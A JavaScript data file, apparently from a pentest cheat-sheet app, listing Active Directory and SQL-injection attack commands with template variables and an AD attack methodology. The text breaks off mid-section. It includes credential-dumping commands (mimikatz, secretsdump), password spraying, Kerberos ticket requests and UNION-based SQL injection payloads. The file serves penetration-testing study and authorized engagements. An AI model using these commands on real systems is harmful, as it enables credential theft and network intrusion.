/* ─── Variables ──────────────────────────────────────────────────────────────── */
const VARIABLES = {
  '$$IP': {
    name: '$$IP',
    description: 'Target IP address',
    howToGet: [
      { method: 'From scope doc', notes: 'Provided in the engagement scope or briefing.' },
      { method: 'DNS lookup', command: 'nslookup $$DOMAIN', notes: 'Resolves the target domain to an IP.' },
      { method: 'Ping', command: 'ping $$DOMAIN', notes: 'Quick check if host is live and resolves.' },
    ],
  },
  '$$DOMAIN': {
    name: '$$DOMAIN',
    description: 'Target Active Directory domain (e.g. Muath.local)',
    howToGet: [
      { method: 'From scope doc', notes: 'Provided in the engagement scope.' },
      { method: 'Enumerate from host', command: 'systeminfo | findstr /B /C:"Domain"', notes: 'Run on a domain-joined host.' },
      { method: 'LDAP query', command: 'nltest /dclist:', notes: 'Lists domain controllers for the current domain.' },
    ],
  },
  '$$DC': {
    name: '$$DC',
    description: 'Domain controller IP or hostname',
    howToGet: [
      { method: 'nltest', command: 'nltest /dsgetdc:$$DOMAIN', notes: 'Returns the DC for the domain.' },
      { method: 'nslookup SRV', command: 'nslookup -type=SRV _ldap._tcp.$$DOMAIN', notes: 'DNS SRV record for LDAP.' },
      { method: 'nmap', command: 'nmap -p 88 $$IP/24 --open', notes: 'Kerberos port 88 indicates a DC.' },
    ],
  },
  '$$USER': {
    name: '$$USER',
    description: 'Target username (plain text)',
    howToGet: [
      { method: 'LDAP enumeration', command: 'ldapsearch -x -H ldap://$$DC -b "DC=$$DOMAIN" "(objectClass=user)" sAMAccountName', notes: 'Requires anonymous or authenticated LDAP.' },
      { method: 'Kerbrute userenum', command: 'kerbrute userenum --dc $$DC -d $$DOMAIN users.txt', notes: 'Fast Kerberos-based user enumeration.' },
      { method: 'enum4linux', command: 'enum4linux -U $$IP', notes: 'SMB/RPC user enumeration.' },
    ],
  },
  '$$PASSWORD': {
    name: '$$PASSWORD',
    description: 'Target plaintext password',
    howToGet: [
      { method: 'Credential spray', command: 'crackmapexec smb $$IP -u $$USER -p passwords.txt', notes: 'Spray a password list against the target.' },
      { method: 'Crack from hash', command: 'hashcat -m 1000 $$HASH $$WORDLIST', notes: 'Crack NTLM hash offline.' },
      { method: 'Secretsdump', command: 'secretsdump.py $$DOMAIN/$$USER:$$PASSWORD@$$DC', notes: 'Dump creds after gaining initial foothold.' },
    ],
  },
  '$$HASH': {
    name: '$$HASH',
    description: 'NTLM hash (LM:NT format)',
    howToGet: [
      { method: 'Mimikatz sekurlsa', command: 'mimikatz # sekurlsa::logonpasswords', notes: 'Dumps LSASS; requires SeDebugPrivilege.' },
      { method: 'Secretsdump (remote)', command: 'secretsdump.py $$DOMAIN/$$USER:$$PASSWORD@$$IP', notes: 'Remote SAM/NTDS dump via SMB.' },
      { method: 'Mimikatz lsadump', command: 'mimikatz # lsadump::sam', notes: 'Local SAM dump; requires local admin.' },
    ],
  },
  '$$LHOST': {
    name: '$$LHOST',
    description: 'Attacker/listener IP address',
    howToGet: [
      { method: 'ifconfig / ip a', command: 'ip a show tun0', notes: 'tun0 is typically your VPN interface on HTB/CTFs.' },
      { method: 'Windows', command: 'ipconfig', notes: 'Check your active network adapter.' },
    ],
  },
  '$$LPORT': {
    name: '$$LPORT',
    description: 'Local listener port on attacker machine',
    howToGet: [
      { method: 'Choose a free port', notes: 'Pick any unused port, e.g. 4444, 9001, 1337.' },
      { method: 'Check used ports', command: 'ss -tlnp', notes: 'Ensure the port is not already in use.' },
    ],
  },
  '$$SID': {
    name: '$$SID',
    description: 'Domain SID (Security Identifier)',
    howToGet: [
      { method: 'wmic', command: 'wmic useraccount where name="$$USER" get sid', notes: 'Get SID for a specific user on Windows.' },
      { method: 'PowerShell', command: 'Get-ADDomain | Select-Object DomainSID', notes: 'Get domain SID from AD module.' },
      { method: 'lookupsid.py', command: 'lookupsid.py $$DOMAIN/$$USER:$$PASSWORD@$$DC', notes: 'Enumerate SIDs via RPC.' },
    ],
  },
  '$$SHARE': {
    name: '$$SHARE',
    description: 'SMB share name on the target',
    howToGet: [
      { method: 'CrackMapExec', command: 'crackmapexec smb $$IP -u $$USER -p $$PASSWORD --shares', notes: 'Lists available SMB shares.' },
      { method: 'smbclient -L', command: 'smbclient -L //$$IP/ -U $$USER%$$PASSWORD', notes: 'Lists shares via SMB.' },
    ],
  },
  '$$TICKET': {
    name: '$$TICKET',
    description: 'Path to a Kerberos ticket (.ccache or .kirbi)',
    howToGet: [
      { method: 'getTGT.py', command: 'getTGT.py $$DOMAIN/$$USER:$$PASSWORD', notes: 'Request a TGT using credentials.' },
      { method: 'Pass-the-hash TGT', command: 'getTGT.py $$DOMAIN/$$USER -hashes :$$HASH', notes: 'Request TGT using NTLM hash.' },
      { method: 'Rubeus asktgt', command: 'Rubeus.exe asktgt /user:$$USER /password:$$PASSWORD /domain:$$DOMAIN /ptt', notes: 'Windows-side TGT request and injection.' },
    ],
  },

  /* ── Web / SQLi variables ───────────────────────────────────────────────── */
  '$$VULN_URL': {
    name: '$$VULN_URL',
    description: 'Full URL of the vulnerable endpoint (e.g. http://10.10.10.5/page.php?id=1)',
    howToGet: [
      { method: 'Browser address bar', notes: 'Navigate to the page and copy the full URL including GET parameters.' },
      { method: 'Burp Suite', notes: 'Intercept request → right-click → Copy URL. For POST, record the URL separately.' },
      { method: 'DevTools Network tab', notes: 'Click the request → Headers tab → Request URL.' },
    ],
  },
  '$$VULN_PARAM': {
    name: '$$VULN_PARAM',
    description: 'Vulnerable HTTP parameter name (e.g. id, username, search)',
    howToGet: [
      { method: 'Manual probe', notes: "Inject ' into each parameter one at a time — SQL error or response change = injection point." },
      { method: 'Arjun discovery', command: 'arjun -u http://$$IP/page.php', notes: 'Finds hidden GET/POST parameters.' },
      { method: 'Burp Suite active scan', notes: 'Right-click request → Actively scan selected insertion points.' },
    ],
  },
  '$$DB_TYPE': {
    name: '$$DB_TYPE',
    description: 'Database engine (MySQL, MSSQL, PostgreSQL, Oracle, SQLite)',
    howToGet: [
      { method: 'Nmap version scan', command: 'nmap -sV -p 3306,1433,5432,1521 $$IP', notes: '3306=MySQL, 1433=MSSQL, 5432=PostgreSQL, 1521=Oracle.' },
      { method: 'HTTP error message', notes: '"You have an error in your SQL syntax" = MySQL. "Unclosed quotation mark" = MSSQL. "ERROR: syntax error at or near" = PostgreSQL.' },
      { method: 'sqlmap banner', command: "sqlmap -u '$$VULN_URL' --banner --batch", notes: 'Reads the DB version string via injection.' },
    ],
  },
  '$$DB_NAME': {
    name: '$$DB_NAME',
    description: 'Target database / schema name to extract from',
    howToGet: [
      { method: 'sqlmap current-db', command: "sqlmap -u '$$VULN_URL' --current-db --batch", notes: '' },
      { method: 'sqlmap list all DBs', command: "sqlmap -u '$$VULN_URL' --dbs --batch", notes: '' },
      { method: 'MySQL manual', command: "' UNION SELECT database(),NULL-- -", notes: 'Inject into the vulnerable parameter.' },
      { method: 'MSSQL manual', command: "' UNION SELECT DB_NAME(),NULL-- -", notes: '' },
      { method: 'PostgreSQL manual', command: "' UNION SELECT current_database(),NULL-- -", notes: '' },
    ],
  },
  '$$DB_TABLE': {
    name: '$$DB_TABLE',
    description: 'Target table name within $$DB_NAME',
    howToGet: [
      { method: 'sqlmap tables', command: "sqlmap -u '$$VULN_URL' -D $$DB_NAME --tables --batch", notes: '' },
      { method: 'MySQL manual', command: "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- -", notes: '' },
      { method: "MSSQL manual", command: "' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'-- -", notes: "xtype='U' = user tables only." },
      { method: 'PostgreSQL manual', command: "' UNION SELECT tablename,NULL FROM pg_tables WHERE schemaname='public'-- -", notes: '' },
    ],
  },
  '$$DB_COLUMN': {
    name: '$$DB_COLUMN',
    description: 'Target column name within $$DB_TABLE (e.g. password, token)',
    howToGet: [
      { method: 'sqlmap columns', command: "sqlmap -u '$$VULN_URL' -D $$DB_NAME -T $$DB_TABLE --columns --batch", notes: '' },
      { method: 'MySQL manual', command: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='$$DB_TABLE'-- -", notes: '' },
      { method: 'MSSQL manual', command: "' UNION SELECT name,NULL FROM syscolumns WHERE id=OBJECT_ID('$$DB_TABLE')-- -", notes: '' },
      { method: 'PostgreSQL manual', command: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='$$DB_TABLE'-- -", notes: '' },
    ],
  },
  '$$DB_USER': {
    name: '$$DB_USER',
    description: 'Database service account / authenticated DB username',
    howToGet: [
      { method: 'sqlmap current-user', command: "sqlmap -u '$$VULN_URL' --current-user --batch", notes: '' },
      { method: 'MySQL manual', command: "' UNION SELECT user(),NULL-- -", notes: 'Returns user like root@localhost.' },
      { method: 'MSSQL manual', command: "' UNION SELECT SYSTEM_USER,NULL-- -", notes: '' },
      { method: 'PostgreSQL manual', command: "' UNION SELECT current_user,NULL-- -", notes: '' },
    ],
  },
  '$$WORDLIST': {
    name: '$$WORDLIST',
    description: 'Path to wordlist / dictionary file for brute-forcing and fuzzing',
    howToGet: [
      { method: 'rockyou (Kali built-in)', command: 'ls /usr/share/wordlists/rockyou.txt', notes: 'May be gzipped — run: gunzip /usr/share/wordlists/rockyou.txt.gz' },
      { method: 'SecLists passwords', command: 'ls /usr/share/seclists/Passwords/', notes: 'Install: sudo apt install seclists' },
      { method: 'SecLists web dirs', command: 'ls /usr/share/seclists/Discovery/Web-Content/', notes: 'raft-medium-directories.txt is a solid default for web fuzzing.' },
      { method: 'SecLists DNS', command: 'ls /usr/share/seclists/Discovery/DNS/', notes: 'subdomains-top1million-5000.txt for subdomain bruting.' },
    ],
  },

  /* ── Active Directory variables ─────────────────────────────────────────── */
  '$$TARGET_HOST': {
    name: '$$TARGET_HOST',
    description: 'Target host IP or hostname for lateral movement (not the DC)',
    howToGet: [
      { method: 'Find DA sessions', command: 'nxc smb $$IP/24 -u $$USER -H $$HASH --loggedon-users', notes: 'Sweep subnet — find hosts where a DA is currently logged on.' },
      { method: 'Find local admin reach', command: 'nxc smb $$IP/24 -u $$USER -H $$HASH --continue-on-success', notes: '"Pwn3d!" marks every host where your hash is local admin.' },
      { method: 'BloodHound', notes: 'Mark your user Owned → query "Find computers where Domain Admins have sessions".' },
    ],
  },
  '$$CHILD_DOMAIN': {
    name: '$$CHILD_DOMAIN',
    description: 'Child domain FQDN for cross-trust attacks (e.g. child.Muath.local)',
    howToGet: [
      { method: 'nltest', command: 'nltest /trusted_domains', notes: 'Lists all trusted domains including child domains.' },
      { method: 'nxc ldap', command: 'nxc ldap $$DC -u $$USER -p $$PASSWORD --trusted-for-delegation', notes: 'Enumerate trust relationships via LDAP.' },
      { method: 'BloodHound', notes: 'Enable "Show Cross-Domain Edges" to see trust relationships and child domains.' },
    ],
  },
  '$$CHILD_SID': {
    name: '$$CHILD_SID',
    description: 'Child domain SID for SID History / Golden Ticket cross-trust attacks',
    howToGet: [
      { method: 'lookupsid.py', command: 'lookupsid.py $$CHILD_DOMAIN/$$USER:$$PASSWORD@$$DC', notes: 'Enumerate SIDs of the child domain.' },
      { method: 'PowerShell (domain-joined)', command: 'Get-ADDomain -Identity $$CHILD_DOMAIN | Select-Object DomainSID', notes: 'Requires RSAT AD module on a domain-joined host.' },
      { method: 'impacket-getPac', command: 'impacket-getPac -targetUser Administrator $$CHILD_DOMAIN/$$USER:$$PASSWORD', notes: 'Extracts domain SID from Kerberos PAC.' },
    ],
  },
  '$$CA_NAME': {
    name: '$$CA_NAME',
    description: 'Certificate Authority name for ADCS attacks (e.g. CORP-CA)',
    howToGet: [
      { method: 'certipy find', command: 'certipy find -u $$USER@$$DOMAIN -p $$PASSWORD -dc-ip $$DC -stdout', notes: 'Lists all CAs in the domain. Save the CA name for cert requests.' },
      { method: 'nxc adcs', command: 'nxc ldap $$DC -u $$USER -p $$PASSWORD -M adcs', notes: 'Enumerate ADCS Certificate Authorities via LDAP.' },
      { method: 'certutil (Windows)', command: 'certutil -config - -ping', notes: 'Lists available CAs on a Windows host.' },
    ],
  },
  '$$ADCS_TEMPLATE': {
    name: '$$ADCS_TEMPLATE',
    description: 'Vulnerable ADCS certificate template name (e.g. UserAuthentication)',
    howToGet: [
      { method: 'certipy find vulnerable', command: 'certipy find -u $$USER@$$DOMAIN -p $$PASSWORD -dc-ip $$DC -vulnerable -stdout', notes: 'Shows only vulnerable templates with ESC classification (ESC1, ESC3, etc.).' },
      { method: 'Certify (Windows)', command: 'Certify.exe find /vulnerable', notes: 'Windows-side ADCS enum. Lists templates with misconfigs.' },
    ],
  },
  '$$GPO_GUID': {
    name: '$$GPO_GUID',
    description: 'Group Policy Object GUID for GPO abuse (e.g. {A1B2C3D4-...})',
    howToGet: [
      { method: 'nxc gpo_owners', command: 'nxc smb $$DC -u $$USER -p $$PASSWORD -M gpo_owners', notes: 'Find GPOs where the current user has write access.' },
      { method: 'PowerShell (domain-joined)', command: 'Get-GPO -All | Select-Object DisplayName,Id', notes: 'Lists all GPOs with their GUIDs. Check BloodHound for which ones you can modify.' },
      { method: 'BloodHound', notes: 'Look for GPO write edges from your user or groups. Click the GPO node to see its GUID.' },
    ],
  },
};

const KNOWN_VAR_NAMES = Object.keys(VARIABLES);

const VAR_GROUPS = [
  { name: 'Target',         vars: ['$$IP', '$$DOMAIN', '$$DC', '$$TARGET_HOST', '$$SID', '$$SHARE', '$$CHILD_DOMAIN', '$$CHILD_SID'] },
  { name: 'Credentials',    vars: ['$$USER', '$$PASSWORD', '$$HASH', '$$TICKET'] },
  { name: 'Attacker',       vars: ['$$LHOST', '$$LPORT'] },
  { name: 'Active Directory', vars: ['$$CA_NAME', '$$ADCS_TEMPLATE', '$$GPO_GUID'] },
  { name: 'SQL Injection',  vars: ['$$VULN_URL', '$$VULN_PARAM', '$$DB_TYPE', '$$DB_NAME', '$$DB_TABLE', '$$DB_COLUMN', '$$DB_USER'] },
  { name: 'Tools',          vars: ['$$WORDLIST'] },
];

/* ─── Tag Filtering ──────────────────────────────────────────────────────────── */
const TACTIC_TAGS = {
  'recon':            ['Linux', 'Network', 'Web'],
  'basic-enum':       ['Windows'],
  'active-directory': ['Windows', 'Linux', 'Active Directory', 'Kerberos', 'Network'],
  'initial-access':   ['Windows', 'Linux', 'Active Directory', 'Kerberos'],
  'def-evasion':      ['Windows'],
  'execution':        ['Windows', 'Linux'],
  'privesc':          ['Windows', 'Linux'],
  'cred-access':      ['Windows', 'Kerberos'],
  'mssql':            ['Windows', 'Linux', 'Database'],
  'persistence':      ['Windows', 'Active Directory'],
  'post-exploit':     ['Windows', 'Linux'],
  'footprinting':     ['Linux', 'Network'],
  'webapp':           ['Linux', 'Web'],
  'sqlmap':           ['Linux', 'Web', 'Database'],
  'netexec':          ['Windows', 'Linux', 'Active Directory', 'Network'],
};

const ALL_FILTER_TAGS = ['Windows', 'Linux', 'Active Directory', 'Kerberos', 'Network', 'Web', 'Database'];

/* ─── Sidebar Groups ─────────────────────────────────────────────────────────── */
const TACTIC_GROUPS = [
  {
    id: 'group-methodologies',
    name: 'Methodologies',
    icon: '📚',
    tacticIds: ['methodologies'],
  },
  {
    id: 'group-recon',
    name: 'Reconnaissance',
    icon: '🔍',
    tacticIds: ['recon', 'footprinting'],
  },
  {
    id: 'group-web',
    name: 'Web Application',
    icon: '🌐',
    tacticIds: ['webapp'],
  },
  {
    id: 'group-foothold',
    name: 'Initial Foothold',
    icon: '🚪',
    tacticIds: ['initial-access', 'def-evasion', 'execution'],
  },
  {
    id: 'group-privesc',
    name: 'Privilege Escalation',
    icon: '📈',
    tacticIds: ['privesc', 'cred-access'],
  },
  {
    id: 'group-ad',
    name: 'Active Directory',
    icon: '🏰',
    tacticIds: ['active-directory'],
  },
  {
    id: 'group-post',
    name: 'Post-Compromise',
    icon: '🏴',
    tacticIds: ['basic-enum', 'mssql', 'persistence', 'post-exploit'],
  },
  {
    id: 'group-sqlmap',
    name: 'sqlmap Tool',
    icon: '🗃️',
    tacticIds: ['sqlmap'],
  },
  {
    id: 'group-netexec',
    name: 'NetExec Tool',
    icon: '🖧',
    tacticIds: ['netexec'],
  },
];

/* ─── Tactics ────────────────────────────────────────────────────────────────── */
const TACTICS = [
  /* ── 0. Methodologies ───────────────────────────────────────────────────── */
  {
    id: 'methodologies',
    name: 'Methodologies',
    icon: '📚',
    techniques: [
      {
        id: 'ad-methodology',
        name: 'Active Directory',
        description: 'Full AD attack lifecycle from external recon to domain dominance.',
        tags: ['methodology', 'overview', 'active-directory'],
        theory: {
          intro: 'Active Directory is the backbone of most enterprise networks. A successful AD pentest follows a structured lifecycle: enumerate the domain, identify misconfigurations, escalate privileges, move laterally, and achieve domain dominance. Every phase feeds the next — loot from one step becomes the credential for the next.',
          phases: [
            {
              icon: '🌐',
              name: 'External Recon',
              description: 'Identify the target AD footprint from the outside before gaining any internal access.',
              items: ['DNS zone transfers / dnsdumpster', 'OSINT (LinkedIn, Hunter.io)', 'Email harvesting for usernames', 'Public-facing services: OWA, ADFS, VPN, RDP, MSSQL'],
            },
            {
              icon: '🚪',
              name: 'Initial Foothold',
              description: 'Gain an initial shell or credential on an internal machine to begin domain enumeration.',
              items: ['Password spraying on OWA / VPN / Kerberos', 'Phishing (macro, link, lnk file)', 'Exploit public-facing service (CVE)', 'LLMNR/NBT-NS poisoning with Responder', 'Physical access / rogue device'],
              itemLinks: { 0: { tacticId: 'active-directory', techId: 'ad-recon' }, 3: { tacticId: 'active-directory', techId: 'ad-relay' } },
            },
            {
              icon: '🔍',
              name: 'Internal Recon',
              description: 'Map the domain — users, groups, computers, GPOs, ACLs, trusts, and attack paths.',
              items: ['BloodHound / SharpHound (attack path analysis)', 'PowerView / ldapdomaindump / ldapsearch', 'Port scan + SMB enumeration', 'Share enumeration (null sessions, spider)', 'Password policy (lockout threshold)'],
              itemLinks: { 0: { tacticId: 'active-directory', techId: 'ad-domain-enum' }, 1: { tacticId: 'active-directory', techId: 'ad-domain-enum' }, 2: { tacticId: 'active-directory', techId: 'ad-recon' }, 3: { tacticId: 'active-directory', techId: 'ad-domain-enum' }, 4: { tacticId: 'active-directory', techId: 'ad-recon' } },
            },
            {
              icon: '🔑',
              name: 'Credential Attacks',
              description: 'Harvest valid credentials or hashes without touching LSASS.',
              items: ['AS-REP Roasting (no pre-auth accounts)', 'Kerberoasting (accounts with SPNs)', 'Password spraying (kerbrute, NetExec)', 'SMB relay / NTLM relay (ntlmrelayx)', 'LDAP signing check + relay', 'IPv6 DNS takeover (mitm6)'],
              itemLinks: { 0: { tacticId: 'active-directory', techId: 'ad-recon' }, 1: { tacticId: 'active-directory', techId: 'ad-kerberoast-acl' }, 2: { tacticId: 'active-directory', techId: 'ad-recon' }, 3: { tacticId: 'active-directory', techId: 'ad-relay' }, 4: { tacticId: 'active-directory', techId: 'ad-relay' }, 5: { tacticId: 'active-directory', techId: 'ad-relay' } },
            },
            {
              icon: '⬆️',
              name: 'Privilege Escalation',
              description: 'Escalate from standard domain user to Domain Admin via misconfigurations.',
              items: ['ACL abuse (WriteDACL, GenericAll, ForceChangePassword, AddMember)', 'Unconstrained / Constrained / RBCD delegation', 'GPO abuse (write permissions on GPO)', 'AdminSDHolder persistence', 'Local PE on compromised host → SYSTEM → dump hashes', 'Certificate Services (ADCS ESC1-ESC8)'],
              itemLinks: { 0: { tacticId: 'active-directory', techId: 'ad-kerberoast-acl' }, 1: { tacticId: 'active-directory', techId: 'ad-domain-privesc' }, 2: { tacticId: 'active-directory', techId: 'ad-domain-privesc' }, 3: { tacticId: 'active-directory', techId: 'ad-dcsync' }, 4: { tacticId: 'active-directory', techId: 'ad-local-privesc' }, 5: { tacticId: 'active-directory', techId: 'ad-adcs' } },
            },
            {
              icon: '↔️',
              name: 'Lateral Movement',
              description: 'Move across hosts using stolen credentials, hashes, or Kerberos tickets.',
              items: ['Pass-the-Hash (NTLMv1/v2 hash)', 'Pass-the-Ticket (TGT/TGS)', 'Overpass-the-Hash (hash → TGT)', 'WinRM (evil-winrm)', 'WMI / PsExec / SMBExec / atexec', 'RDP with plaintext or restricted admin'],
              itemLinks: { 0: { tacticId: 'active-directory', techId: 'ad-lateral' }, 1: { tacticId: 'active-directory', techId: 'ad-lateral' }, 2: { tacticId: 'active-directory', techId: 'ad-lateral' }, 3: { tacticId: 'active-directory', techId: 'ad-lateral' }, 4: { tacticId: 'active-directory', techId: 'ad-lateral' }, 5: { tacticId: 'active-directory', techId: 'ad-lateral' } },
            },
            {
              icon: '👑',
              name: 'Domain Dominance',
              description: 'Achieve full domain control — dump all hashes, forge tickets, maintain access.',
              items: ['DCSync (replicate hashes via DRS protocol)', 'Golden Ticket (forge TGT with krbtgt hash)', 'Silver Ticket (forge TGS with service hash)', 'Skeleton Key (patch LSASS on DC)', 'DSRM account abuse', 'AdminSDHolder ACL backdoor'],
              itemLinks: { 0: { tacticId: 'active-directory', techId: 'ad-dcsync' }, 1: { tacticId: 'active-directory', techId: 'ad-dcsync' }, 2: { tacticId: 'active-directory', techId: 'ad-dcsync' }, 3: { tacticId: 'active-directory', techId: 'ad-dcsync' }, 4: { tacticId: 'active-directory', techId: 'ad-dcsync' }, 5: { tacticId: 'active-directory', techId: 'ad-dcsync' } },
            },
            {
              icon: '🌲',
              name: 'Forest & Trust Attacks',
              description: 'Pivot across domain and forest trust boundaries.',
              items: ['Extra SID / SID history injection', 'Trust ticket forgery (cross-domain TGT)', 'Foreign group membership abuse', 'ADCS cross-forest template abuse', 'Child-to-parent domain trust escalation'],
              itemLinks: { 0: { tacticId: 'active-directory', techId: 'ad-cross-trust' }, 1: { tacticId: 'active-directory', techId: 'ad-cross-trust' }, 2: { tacticId: 'active-directory', techId: 'ad-cross-trust' }, 3: { tacticId: 'active-directory', techId: 'ad-adcs' }, 4: { tacticId: 'active-directory', techId: 'ad-cross-trust' } },
            }
          ],
          concepts: [
            {
              name: 'Kerberos Authentication',
              description: 'Primary AD authentication protocol. Uses tickets (TGT/TGS) — passwords never travel the network. Understanding this is key to roasting, delegation, and ticket forgery attacks.',
              flow: ['Client → AS-REQ', 'KDC → TGT (AS-REP)', 'Client → TGS-REQ', 'KDC → Service Ticket', 'Client → Service']
            },
            {
              name: 'NTLM Authentication',
              description: 'Legacy challenge-response protocol. Still used for local accounts, cross-domain, and fallback. Vulnerable to Pass-the-Hash, relay attacks, and offline cracking.',
              flow: ['Client → Negotiate', 'Server → Challenge (nonce)', 'Client → NTHash(challenge)', 'Server / DC → Validates']
            },
            {
              name: 'ACLs & DACLs',
              description: 'Every AD object has a DACL defining who can do what. Misconfigured ACLs are the most common privilege escalation path. BloodHound maps these automatically.',
              items: ['GenericAll → Full control over object', 'WriteDACL → Add any permission', 'WriteOwner → Take object ownership', 'GenericWrite → Write non-protected attributes', 'ForceChangePassword → Change password without knowing old', 'AddMember → Add users to a group']
            },
            {
              name: 'Kerberoasting',
              description: 'Any domain user can request a TGS for any account with an SPN. The ticket is encrypted with the account NTLM hash — crack it offline with hashcat.',
              flow: ['Find SPNs (GetUserSPNs)', 'Request TGS (no special rights)', 'Extract hash from ticket', 'Crack offline → plaintext password']
            },
            {
              name: 'AS-REP Roasting',
              description: 'Accounts with pre-authentication disabled return an AS-REP containing data encrypted with the account hash. No credentials needed to request.',
              flow: ['Find no-preauth accounts', 'AS-REQ without creds', 'Receive AS-REP with enc-timestamp', 'Crack offline with hashcat']
            },
            {
              name: 'Delegation',
              description: 'Allows a service to authenticate to other services on behalf of a user. Misconfigured delegation lets an attacker impersonate any user to any service.',
              items: ['Unconstrained → Service receives full TGT, can impersonate to ANY service', 'Constrained → S4U2Proxy, impersonate to specific services only', 'RBCD → Configured on the resource; attacker-controlled if they have write on computer object']
            },
            {
              name: 'DCSync',
              description: 'Simulates DC replication to dump all NTLM hashes from the domain. Requires DS-Replication-Get-Changes-All — granted to DAs, DCs, and any ACL with this right.',
              flow: ['Gain replication rights (or DA)', 'Call DRSGetNCChanges via impacket/mimikatz', 'Receive all hashes including krbtgt']
            },
            {
              name: 'Golden / Silver Tickets',
              description: 'Forged Kerberos tickets. Golden = forged TGT using krbtgt hash (any service, any user). Silver = forged TGS using service account hash (single service, no DC contact needed).',
              flow: ['Obtain krbtgt hash (DCSync/dump)', 'Forge TGT with mimikatz/impacket', 'Pass-the-Ticket', 'Authenticate as any user to any service']
            },
            {
              name: 'ADCS (Certificate Services)',
              description: 'AD Certificate Services misconfigurations (ESC1-ESC8) allow low-priv users to request certificates that authenticate as any user including Domain Admin.',
              items: ['ESC1: Enroll + SAN in request (cert as DA)', 'ESC4: Write template permissions', 'ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 on CA', 'ESC8: NTLM relay to AD CS HTTP endpoint']
            }
          ],
          tools: [
            { name: 'BloodHound', purpose: 'Graph-based AD attack path analysis. Finds shortest path from any owned user to Domain Admin. Essential for identifying ACL abuse paths.', tags: ['enumeration', 'paths', 'ACLs', 'GUI'] },
            { name: 'SharpHound', purpose: 'Windows BloodHound data collector (.NET). Runs on the compromised host. Use -c All for full collection.', tags: ['collector', 'Windows'] },
            { name: 'bloodhound-python', purpose: 'Linux BloodHound collector via LDAP. No binary needed on target. Use --dns-tcp when DNS issues. Slower than SharpHound.', tags: ['collector', 'Linux', 'LDAP'] },
            { name: 'Impacket', purpose: 'Python AD/Windows toolkit. Core tools: GetUserSPNs, GetNPUsers, secretsdump, psexec, wmiexec, ntlmrelayx, ticketer, getST.', tags: ['credentials', 'execution', 'relay', 'Linux'] },
            { name: 'NetExec (nxc)', purpose: 'Successor to CrackMapExec. Multi-protocol (SMB/LDAP/WinRM/MSSQL/RDP). Password spraying, command execution, dump SAM/LSA/NTDS.', tags: ['spray', 'execution', 'enumeration', 'Linux'] },
            { name: 'Mimikatz', purpose: 'In-memory credential extraction from LSASS. Kerberos ticket manipulation. DCSync. Golden/Silver/Diamond ticket creation. Run as SYSTEM on target.', tags: ['credentials', 'tickets', 'DCSync', 'Windows'] },
            { name: 'Rubeus', purpose: 'C# Kerberos toolkit. Kerberoasting, AS-REP roasting, PTT, S4U delegation abuse, overpass-the-hash, monitor for TGTs.', tags: ['kerberos', 'roasting', 'tickets', 'Windows'] },
            { name: 'PowerView', purpose: 'PowerShell AD enumeration. Get-DomainUser, Get-DomainGroup, Get-ObjectAcl, Find-LocalAdminAccess, Invoke-ACLScanner.', tags: ['enumeration', 'ACLs', 'PowerShell'] },
            { name: 'ldapdomaindump', purpose: 'Dump entire AD via LDAP. Outputs HTML/JSON/CSV of users, groups, computers, GPOs, trusts. No agent on target needed.', tags: ['enumeration', 'LDAP', 'Linux'] },
            { name: 'Kerbrute', purpose: 'Fast user enumeration and password spraying via Kerberos pre-auth. Does not trigger standard logon failure logs.', tags: ['spray', 'user enum', 'Kerberos'] },
            { name: 'Responder', purpose: 'LLMNR/NBT-NS/MDNS/WPAD poisoner. Captures NTLMv2 hashes from broadcast name resolution. Pair with ntlmrelayx for relay.', tags: ['poisoning', 'relay', 'hashes'] },
            { name: 'krbrelayx', purpose: 'Exploit unconstrained delegation via DNS relay to capture TGTs of machines authenticating to a rogue service.', tags: ['delegation', 'relay', 'Kerberos'] },
            { name: 'Certipy', purpose: 'ADCS attack tool. Enumerate vulnerable templates, request certs for ESC1-ESC8, authenticate with certificates via PKINIT.', tags: ['ADCS', 'certificates', 'Linux'] },
            { name: 'Hashcat', purpose: 'GPU-accelerated offline hash cracking. Mode 13100 for Kerberoast, 18200 for AS-REP, 5600 for NTLMv2, 1000 for NTLM.', tags: ['cracking', 'offline'] }
          ]
        },
        subtechniques: []
      },
      /* ── Web Application Methodology ─────────────────────────────────── */
      {
        id: 'web-methodology',
        name: 'Web Application',
        description: 'Full web app pentest lifecycle from recon to post-exploitation.',
        tags: ['methodology', 'overview', 'web'],
        theory: {
          intro: 'Web application pentesting follows a structured lifecycle: map the attack surface, fingerprint technologies, test every input vector for injection, abuse authentication and access control flaws, then chain findings to demonstrate real impact. Every parameter, header, and endpoint is a potential vulnerability.',
          phases: [
            {
              icon: '🔍',
              name: 'Reconnaissance',
              description: 'Passive and active information gathering — enumerate subdomains, discover technologies, and map the attack surface before touching the app.',
              items: ['Subdomain Enumeration', 'DNS Recon', 'Google Dorking', 'OSINT / Hunter.io', 'Wayback Machine', 'Technology Fingerprinting'],
              itemLinks: { 5: { tacticId: 'webapp', techId: 'web-recon' } },
            },
            {
              icon: '🗺️',
              name: 'Scanning & Enumeration',
              description: 'Actively map directories, parameters, and endpoints. Identify WAF, CMS, and framework versions.',
              items: ['Directory Bruteforce', 'Parameter Discovery', 'Crawling & Spidering', 'WAF Detection', 'nuclei Scan'],
              itemLinks: { 0: { tacticId: 'webapp', techId: 'web-recon' }, 1: { tacticId: 'webapp', techId: 'web-recon' }, 3: { tacticId: 'webapp', techId: 'web-recon' }, 4: { tacticId: 'webapp', techId: 'web-recon' } },
            },
            {
              icon: '🔐',
              name: 'Authentication Testing',
              description: 'Test login mechanisms, session handling, tokens, and multi-factor authentication for bypasses and weaknesses.',
              items: ['Default Credentials', 'Brute Force Login', 'Password Spraying', 'JWT Attacks', 'OAuth Misconfig', 'Session Fixation', 'MFA Bypass'],
              itemLinks: { 0: { tacticId: 'webapp', techId: 'web-auth' }, 1: { tacticId: 'webapp', techId: 'web-auth' }, 2: { tacticId: 'webapp', techId: 'web-auth' }, 3: { tacticId: 'webapp', techId: 'web-auth' } },
            },
            {
              icon: '💉',
              name: 'Injection Testing',
              description: 'Test every input vector for injection vulnerabilities — SQL, XSS, SSTI, command injection, SSRF, and XXE.',
              items: ['SQL Injection', 'Cross-Site Scripting (XSS)', 'Server-Side Template Injection', 'Command Injection', 'SSRF', 'XXE', 'LDAP Injection'],
